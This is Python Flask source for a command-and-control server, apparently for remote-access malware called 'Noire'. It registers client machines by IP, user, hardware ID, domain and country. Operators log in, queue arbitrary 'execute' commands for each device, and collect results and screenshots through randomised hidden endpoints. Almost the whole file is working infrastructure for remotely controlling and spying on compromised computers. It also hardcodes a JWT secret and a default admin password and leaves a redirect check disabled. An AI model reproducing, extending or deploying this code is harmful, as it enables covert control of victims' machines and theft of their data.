import flask
from flask_sqlalchemy import SQLAlchemy
import flask_login
import os
import secrets
import bcrypt
import base64
import jwt
from eventlet import wsgi, listen

app = flask.Flask(__name__)
app.secret_key = secrets.token_hex()
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'

db = SQLAlchemy()

global allPermissions
allPermissions = ['change_user_password', 'change_admin_password', 'change_user_permissions',
                  'change_admin_permissions']

class User(db.Model):
    """A User in the database
    """
    __tablename__ = 'users'

    username = db.Column(db.String, primary_key=True)
    password = db.Column(db.String)
    authenticated = db.Column(db.Boolean, default=False)
    groups = db.Column(db.String, default='users')
    administrator = db.Column(db.Boolean, default=False)
    change_user_passwords = db.Column(db.Boolean, default=False)
    change_admin_passwords = db.Column(db.Boolean, default=False)
    change_user_permissions = db.Column(db.Boolean, default=False)
    change_admin_permissions = db.Column(db.Boolean, default=False)

    def has_permission(self, permission:str) -> bool:
        """
        Check if the user has a specific permission.

        Args:
            permission (str): The permission to check.

        Returns:
            bool: True if the user has the permission, False otherwise.
        """
        permsList = ['change_user_passwords', 'change_admin_passwords',
                     'change_user_permissions', 'change_admin_permissions', 'administrator']
        if permission not in permsList: return False
        if getattr(self, permission):
            return getattr(self, permission)
        for group in self.groups.split(','):#Use order as priority? Assume group exists
            currentGroup = Group.query.filter_by(name=group)[0]
            if getattr(currentGroup, permission): return True
        return False

    def is_active(self):
        """True, as all users are active."""
        return True

    def get_id(self):
        return self.username

    def is_authenticated(self):
        """Return True if the user is authenticated."""
        return self.authenticated

    def is_anonymous(self):
        """False, as anonymous users aren't supported."""
        return False
    
class Group(db.Model):
    """A Group in the database
    """
    __tablename__ = "groups"
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String)
    administrator = db.Column(db.Boolean, default=False)
    change_user_passwords = db.Column(db.Boolean, default=False)
    change_admin_passwords = db.Column(db.Boolean, default=False)
    change_user_permissions = db.Column(db.Boolean, default=False)
    change_admin_permissions = db.Column(db.Boolean, default=False)
    
class Device(db.Model):
    """A Device connected to the server
    """
    __tablename__= "devices"
    
    id = db.Column(db.Integer, primary_key=True)
    jwt = db.Column(db.String)
    ip = db.Column(db.String)
    user = db.Column(db.String)
    os = db.Column(db.String)
    domain = db.Column(db.String)
    country = db.Column(db.String)
    hwid = db.Column(db.String)
    notes = db.Column(db.String)
    initialConnection = db.Column(db.String)
    uniquePath = db.Column(db.String)
    taskPath = db.Column(db.String)
    responsePath = db.Column(db.String)

class Task(db.Model):
    """A task requested for a client to run
    """
    
    __tablename__ = "tasks"
    
    id = db.Column(db.String, primary_key=True)
    owner = db.Column(db.String)
    command = db.Column(db.String)
    arguments = db.Column(db.String)
    running = db.Column(db.Boolean, default=False)
    response = db.Column(db.String, default='NOTRUN')

db.init_app(app)
with app.app_context():
    db.create_all()

login_manager = flask_login.LoginManager()
login_manager.init_app(app)
login_manager.refresh_view = '/login'
login_manager.login_view = '/login'
    
@login_manager.user_loader
def user_loader(user_id):
    return User.query.get(user_id)

def valid_login(username:str, passw:str) -> bool:
    """Check if the given credentials are a valid account

    Args:
        username (str): The username to check
        passw (str): The password to check

    Returns:
        bool: If there is an account with the given credentials or not
    """
    if not username or not passw: return False
    user = User.query.get(username)
    if not user: return False
    try:
        passw = bytes(passw, 'utf-8')
        uPassword = bytes(user.password, 'utf-8')
        return bcrypt.checkpw(passw, uPassword)
    except:
        return False

def addAccount(username:str, passw:str, isAdmin:bool = False) -> str:
    """
    Add a user to the database.

    Args:
        username (str): The username of the account to add.
        passw (str): The password of the account to add.
        isAdmin (bool, optional): Whether the account should have admin privileges.
            Defaults to False.

    Returns:
        str: A message indicating whether the account was created successfully.
    """
    if not username or not passw: return "All fields are required"
    user = User.query.get(username)
    if user: return "An account with this username already exists"
    passw = bytes(passw, 'utf-8')
    salt = bcrypt.gensalt(12)
    passw = str(bcrypt.hashpw(passw, salt))[2:-1]
    groups = ['users']
    if isAdmin: groups.append('admins')
    newUser = User(username=username, administrator = isAdmin, password=str(passw), groups=",".join(groups))
    db.session.add(newUser)
    db.session.commit()
    return 'Account created successfully'

def addGroup(name:str, administrator:bool = False, change_user_passwords:bool = False, change_admin_passwords:bool = False, change_user_permissions:bool = False, change_admin_permissions:bool = False) -> str:
    """
    Add a group to the database.

    Args:
        name (str): The name of the group to add.
        administrator (bool, optional): Whether the group should have administrator privileges.
            Defaults to False.
        change_user_passwords (bool, optional): Whether the group should be able to change user passwords.
            Defaults to False.
        change_admin_passwords (bool, optional): Whether the group should be able to change admin passwords.
            Defaults to False.
        change_user_permissions (bool, optional): Whether the group should be able to change user permissions.
            Defaults to False.
        change_admin_permissions (bool, optional): Whether the group should be able to change admin permissions.
            Defaults to False.

    Returns:
        str: A message indicating whether the group was created successfully.
    """
    # Check if required fields are provided
    if not name: return "Group name is required"

    # Check if the group already exists
    group = Group.query.filter_by(name=name)
    if group: return "A group with this name already exists"

    # Create the new group
    new_group = Group(
        name=name,
        administrator=administrator,
        change_user_passwords=change_user_passwords,
        change_admin_passwords=change_admin_passwords,
        change_user_permissions=change_user_permissions,
        change_admin_permissions=change_admin_permissions
    )
    
    # Add the new group to the database
    db.session.add(new_group)
    db.session.commit()

    return 'Group created successfully'


#Startup checks
with app.app_context():
    a = addAccount('admin', 'test', True)#group  adds if not unique, stop this
    a = addGroup('admins', True, True, True, True, True)
    a = addGroup('users')
    
    #Delete all known links for devices, so new can be generated
    if Device.query.all():
        for dev in Device.query.all():
            dev.uniquePath, dev.taskPath, dev.responsePath = '', '', ''

@app.errorhandler(404)
def not_found(error):
    return flask.render_template('404.html'), 404

@app.route('/')
def indexPage():
    return flask.redirect(flask.url_for('loginPage'))

#Load icon and CSS stylesheet
@app.route('/favicon.ico')
def favicon():
    return flask.send_from_directory(os.path.join(app.root_path, 'static'),
                               'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/style.css')
def stylesheet():
    return flask.send_from_directory(os.path.join(app.root_path, 'static'), 'style.css')

@app.route('/login', methods=['POST', 'GET'])
def loginPage():
    """
    This function is the handler for the '/login' endpoint, which is accessed via both POST and GET methods.
    It renders the 'logIn.html' template and passes the 'error' variable to it.

    Args:
        None

    Returns:
        If the request method is POST and the login credentials are valid, it redirects to the 'overviewPage'.
        If the user is remembered (i.e., logged in previously), it redirects to the 'overviewPage'.
        Otherwise, it renders the 'logIn.html' template with the 'error' variable.
    """
    try:
        del flask.session['users']
        del flask.session['groups']
    except:
        pass
    error = None
    if flask.request.method == 'POST':
        if valid_login(flask.request.form['username'],
                       flask.request.form['password']):
            user = User.query.get(flask.request.form['username'])
            user.authenticated = True
            db.session.commit()
            flask_login.login_user(user, remember=True)
            next = flask.request.args.get('next')
            '''if not url_has_allowed_host_and_scheme(next, flask.request.host):
                return flask.abort(400)'''
            return flask.redirect(next or flask.url_for('overviewPage'))
        else:
            error = 'Invalid username/password'
    if flask_login.login_remembered():
        return flask.redirect(flask.url_for('overviewPage'))
    try:
        user = flask.request.form['username']
    except KeyError:
        user = ""
    return flask.render_template('logIn.html', error = error)

@app.route('/logout')
@flask_login.login_required
def logoutPage():
    """
    Logs out the current user by setting authenticated to False, committing the change to the database, and logging out the user. 
    Returns the rendered 'logOut.html' template.
    """
    user = User.query.get(flask_login.current_user.username)
    user.authenticated = False#might not need ths due to flask_login.logout_user
    db.session.commit()
    flask_login.logout_user()
    return flask.render_template('logOut.html')#might just want to redirect to login page


@app.route('/overview')
@flask_login.login_required
def overviewPage():
    devAmount = 0
    if Device.query.all():
        devAmount = len(Device.query.all())
    return flask.render_template('overview.html', user = flask_login.current_user.username, devices = devAmount)

@app.route('/clients', methods=['GET', 'POST'])
@flask_login.login_required
def clientsPage():
    if flask.request.method == 'GET':
        return flask.render_template('clients.html', clients = Device.query.all())
    else:
        if Device.query.filter_by(jwt=flask.request.form['jwt']).all():
            if flask.request.form['action'] == 'execute':
                task = Task(id=generateRandPath(), owner=flask.request.form['jwt'],
                            command='execute', arguments=flask.request.form['arguments'])
                db.session.add(task)
                db.session.commit()
            flask.flash('Command executed', 'success')#doesnt show because redirect, show on load template?
            return flask.render_template('clients.html', clients = Device.query.all())
        return flask.render_template('clients.html', clients = Device.query.all())

@app.route('/settings')
@flask_login.fresh_login_required
def settingsPage():
    return flask.render_template('settings.html')

@app.route('/settings/change_password', methods=['GET', 'POST'])
@flask_login.fresh_login_required
def changePassPage():
    """
    Route for resetting user passwords. Requires fresh login. If a user has the permissions 
    to change both user and admin passwords, all users are shown. If a user has the permission 
    to change only user passwords, only non-admin users are shown. If a user has the permission 
    to change only admin passwords, only admin users are shown. If a user does not have the 
    permissions to change any passwords, only the current user is shown. If a user submits a 
    password reset form, the password is updated in the database if the passwords match and the 
    username is valid. Returns the rendered changePassword.html template with a list of users 
    to choose from.
    """
    user = flask_login.current_user
    aUsers = User.query.all()
    if not user.has_permission('change_user_passwords') and not user.has_permission('change_admin_passwords'):
        users = user
    elif user.has_permission('change_user_passwords') and user.has_permission('change_admin_passwords'):
        users = aUsers
    elif user.has_permission('change_user_passwords'):
        users = []
        for user in aUsers:
            if not 'admins' in user.groups.split(","): users.append(user)
    else:
        users = []
        for user in aUsers:
            if 'admins' in user.groups.split(","): users.append(user)
    users = [user.username for user in users]
    if flask.request.method == 'POST':
        try:
            if flask.request.form['password'] != flask.request.form['cPassword']:
                flask.flash('The given passwords do not match', 'error')
            else:
                user = User.query.get(flask.request.form['users'])
                users.index(user.username)#Check if user is available for them to edit
                passw = flask.request.form['password'].encode('utf-8')
                user.password = str(bcrypt.hashpw(passw, bcrypt.gensalt(12)))[2:-1]
                db.session.commit()
                flask.flash('Password has been changed', 'success')
        except:
            flask.flash('An invalid username was given', 'error')
    return flask.render_template('changePassword.html', users = users)

@app.route('/settings/change_permissions')
@flask_login.fresh_login_required
def selectChangePermsPage():
    user = flask_login.current_user
    if not user.has_permission('change_user_permissions') and not user.has_permission('change_admin_permissions'):
        flask.flash('You do not have access to this page', 'error')
        flask.abort(400)
    users = []
    groups = []
    if user.has_permission('change_user_permissions') or user.has_permission('change_admin_permissions'):
        aUsers = User.query.all()
        if user.has_permission('change_user_permissions') and user.has_permission('change_admin_permissions'):
            groups = Group.query.all()
            users = aUsers
        elif user.has_permission('change_user_permissions'):
            for u in aUsers:
                if not u.has_permission('administrator'): users.append(u)
            groups = Group.query.filter_by(admin=False).all()
        else:
            for u in aUsers:
                if u.has_permission('administrator'): users.append(u)
            groups = Group.query.filter_by(admin=True).all()
    flask.session['users'] = [u.username for u in users]
    flask.session['groups'] = [g.name for g in groups]
    return flask.render_template('selectChangePermissions.html', users = flask.session['users'], groups = flask.session['groups'])

@app.route('/settings/change_permissions/select', methods=['GET', 'POST'])
@flask_login.fresh_login_required
def changePermsPage():
    user = flask_login.current_user
    if not user.has_permission('change_user_permissions') and not user.has_permission('change_admin_permissions'):
        flask.flash('You do not have access to this page', 'error')
        flask.abort(400)
    try:
        print(flask.request.form)
        try:
            users = flask.request.args['users']
            flask.session['users'].index(users)
        except:
            groups = flask.request.args['groups']
            flask.session['groups'].index(groups)
            users = None
        if users:
            target = 'users'
            selected = User.query.filter_by(username=users).first()
        else:
            target = 'groups'
            selected = Group.query.filter_by(name = groups).first()
        print(flask.session['users'])
        print(target)
        print(selected)
        if flask.request.method == 'GET':
            return flask.render_template('changePermissions.html', target = target, selected = selected, isAdmin = user.administrator, editAdmins = user.has_permission('change_admin_permissions'))
        else:#probably need more verification/security checks on this
            if flask.request.form.get('selectAdmin'): selected.administrator = True
            else: selected.administrator = False
            if flask.request.form.get('selectEditAdmins'): selected.change_admin_permissions = True
            else: selected.change_admin_permissions = False
            if flask.request.form.get('selectEditUsers'): selected.change_user_permissions = True
            else: selected.change_user_permissions = False
            if flask.request.form.get('selectChangeAdminPW'): selected.change_admin_passwords = True
            else: selected.change_admin_passwords = False
            if flask.request.form.get('selectChangeUserPW'): selected.change_user_passwords = True
            else: selected.change_user_passwords = False
            flask.flash('Permissions have been changed', 'success')
            db.session.commit()
    except Exception as e:
        try:
            del flask.session['users']
            del flask.session['groups']
        except:
            pass
        flask.flash('An invalid target was given', 'error')
        print(e)
        return flask.redirect(flask.url_for('selectChangePermsPage'))
    try:
        return flask.redirect(flask.url_for('changePermsPage', users=flask.request.args['users']))
    except:
        return flask.redirect(flask.url_for('changePermsPage', groups=flask.request.args['groups']))

#C2 interface
def validateC2Client(request:flask.request) -> bool:
    """
    This function validates the C2 client by checking the request headers and decoding the NClient-Token. 
    It returns a boolean value indicating whether the client is valid or not.
    """
    try:
        if request.headers['User-Agent'].split()[0] != 'NClient': return False
        cToken = request.headers['NClient-Token']
        cToken = jwt.decode(cToken, 'Noire', algorithms=['HS256'])
        #if cToken['ip'] != request.remote_addr: return False #Blocks Proxies, VPN's and LAN devices
        cToken['os']
        cToken['user']
        cToken['hwid']
        cToken['time']
        cToken['country']
        cToken['domain']
        #add check for payload, validate encryption etc
        #Add check if NClient-Token (jwt) IP is same as request IP
        return True
    except KeyError or jwt.DecodeError:
        return False

def generateRandPath() -> str:
    """
    A function that generates a random path of length 12 consisting of alphanumeric characters.
    Returns: str
    """
    x = ""
    for y in range(12):
        x += secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
    return x

@app.route('/contact')
def contactC2Page():
    """
    A route for the contact page. Validates the C2 client, decodes the JWT, generates random paths, 
    and adds a new client to the database if it doesn't exist. Otherwise, retrieves the paths from 
    the existing client. Finally, it returns a response with the paths in the headers.
    """
    if not validateC2Client(flask.request): return not_found('Invalid')
    jwT = flask.request.headers['NClient-Token']
    if not Device.query.filter_by(jwt=jwT).all():
        token = jwt.decode(jwT, 'Noire', algorithms=["HS256"])
        uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
        newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
                           hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP,
                           initialConnection=token['time'], country=token['country'], domain=token['domain'])
        db.session.add(newClient)
        db.session.commit()
    else:
        a = Device.query.filter_by(jwt=jwT).all()[0]
        uP, tP, rP = a.uniquePath, a.taskPath, a.responsePath
    resp = flask.make_response("")
    resp.headers['NClient-Path'], resp.headers['NClient-TaskPath'], resp.headers['NClient-ResponsePath'] = uP, tP, rP
    return resp
    

@app.route('/c/<c2ID>/<pName>', methods=["GET", "POST"])
def instructReponsePages(c2ID:str, pName:str):
    """
    This function handles the response from a C2 client.

    Args:
        c2ID (str): The unique ID of the C2 client.
        pName (str): The name of the page (task or response).

    Returns:
        str or flask.Redirect: The response to be sent back to the C2 client.
    """
    if not validateC2Client(flask.request): return not_found("Invalid")
    jwT = flask.request.headers['NClient-Token']
    try:
        gjwT = Device.query.filter_by(jwt=jwT).all()[0]
    except KeyError:
        return not_found("Skipped initialisation")#if not in the system, something is fishy
    if c2ID != gjwT.uniquePath: return not_found("Bad unique path")
    if pName != gjwT.taskPath and pName != gjwT.responsePath: return not_found("Bad type path")
    if pName == gjwT.taskPath:
        if flask.request.method != "GET": return not_found("Bad method on control path")
        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN')
        if not tasks: return not_found("No tasks")
        tR = []
        for task in tasks:
            tR.append(jwt.encode({'id': task.id, 'command': task.command, 'args': task.arguments}, 'Noire'))#allow this to be modified
            task.running = True
        db.session.commit()
        return '\n'.join(tR)
    else:
        if flask.request.method != "POST": return not_found("Bad method on control path")
        try:
            task = flask.request.headers['NClient-TaskResponse']
        except KeyError:
            return not_found("No finished task")#flag this in logs
        task = base64.b64decode(task).split(b'*')
        taskID = task[0].decode(); taskResponse = task[1]
        setTask = Task.query.filter_by(owner=jwT, id=taskID).all()
        if not setTask: return not_found('No task with ID')#flag this in logs
        setTask = setTask[0]
        setTask.running = False
        if setTask.command == 'screenshot':
            setTask.response = taskResponse
        setTask.response = base64.b64encode(taskResponse)
        db.session.commit()
        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN').all()
        if not tasks: return ""
        else: return flask.redirect(f'/c/{gjwT.uniquePath}/{gjwT.taskPath}')#Don't return redirect, just return code 200

#Run forever
def start_server(port:int):
    """
    Start a server on the specified port.

    Args:
        port (int): The port number on which the server will listen.

    Returns:
        None
    """
    server = wsgi.Server(listen(('0.0.0.0', port)), '127.0.0.1', app=app)
    print(f"Web server running on http://127.0.0.1:{str(port)}/")
    print(server.address)
    server.serve_forever()